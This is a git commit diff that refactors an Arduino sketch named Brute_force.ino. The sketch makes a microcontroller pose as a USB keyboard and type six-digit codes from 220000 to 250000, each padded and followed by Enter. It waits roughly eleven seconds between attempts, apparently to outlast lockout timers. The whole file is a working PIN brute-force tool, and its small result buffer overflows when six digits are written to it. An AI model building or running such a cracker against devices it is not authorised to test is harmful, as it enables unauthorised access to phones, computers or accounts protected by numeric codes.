de20d5bdc447a847a94496127a3b4f182c7ab154
Denchig <41806376+Denchig@users.noreply.github.com>
2023-09-07 15:45:18 +0300

    refactoring

--- Brute_force.ino
+++ Brute_force.ino
@@ -1,55 +1,48 @@
 #include "Adafruit_TinyUSB.h"
 
 uint8_t const desc_hid_report[] = { TUD_HID_REPORT_DESC_KEYBOARD() };
-
 Adafruit_USBD_HID usb_hid(desc_hid_report, sizeof(desc_hid_report), HID_ITF_PROTOCOL_KEYBOARD, 2, false);
 
-void setup()
-{
-    pinMode(LED_BUILTIN, OUTPUT);
-    usb_hid.begin();
-    delay(1000);
+void setup() {
+  pinMode(LED_BUILTIN, OUTPUT);
+  usb_hid.begin();
+  delay(1000);
 }
 
-int start = 10000;
-int finish = 10005;
-char result[6];
+int start = 220000;
+int finish = 250000;
 
-void typer(char * number)
-{
-    for(int i=6; i>strlen(number); i--)
-    {
-        digitalWrite(LED_BUILTIN, HIGH);
-        usb_hid.keyboardPress(0,48);
-        delay(20);
-        usb_hid.keyboardRelease(0);
-        delay(20);
-        digitalWrite(LED_BUILTIN, LOW);   
-    }
-    char symbol;
-    for(int j=0; j<=strlen(number); j++)
-    {
-        symbol=number[j];
-        digitalWrite(LED_BUILTIN, HIGH);
-        usb_hid.keyboardPress(0,symbol);
-        delay(20);
-        usb_hid.keyboardRelease(0);
-        delay(20);   
-    }
-    usb_hid.keyboardPress(0, 13);
+void typer(char * number) {
+  for(int i = 6; i > strlen(number); i--) {
+    digitalWrite(LED_BUILTIN, HIGH);
+    usb_hid.keyboardPress(0, 48);
     delay(20);
     usb_hid.keyboardRelease(0);
-    delay(1000);
+    delay(20);
     digitalWrite(LED_BUILTIN, LOW);
-    delay(10000);
+  }
+  char symbol;
+  for(int j = 0; j <= strlen(number); j++) {
+    symbol = number[j];
+    digitalWrite(LED_BUILTIN, HIGH);
+    usb_hid.keyboardPress(0, symbol);
+    delay(20);
+    usb_hid.keyboardRelease(0);
+    delay(20);
+  }
+  usb_hid.keyboardPress(0, 13);
+  delay(20);
+  usb_hid.keyboardRelease(0);
+  delay(200);
+  digitalWrite(LED_BUILTIN, LOW);
+  delay(10800);
 }
 
-void loop()
-{
-    for(start; start <= finish; start++)
-    {
-        sprintf(result,"%ld", start);
-        typer(result);
-    }
-    digitalWrite(LED_BUILTIN, HIGH);
+void loop() {
+  for(start; start <= finish; start++) {
+    char result[6];
+    sprintf(result, "%ld", start);
+    typer(result);
+  }
+  digitalWrite(LED_BUILTIN, HIGH);
 }
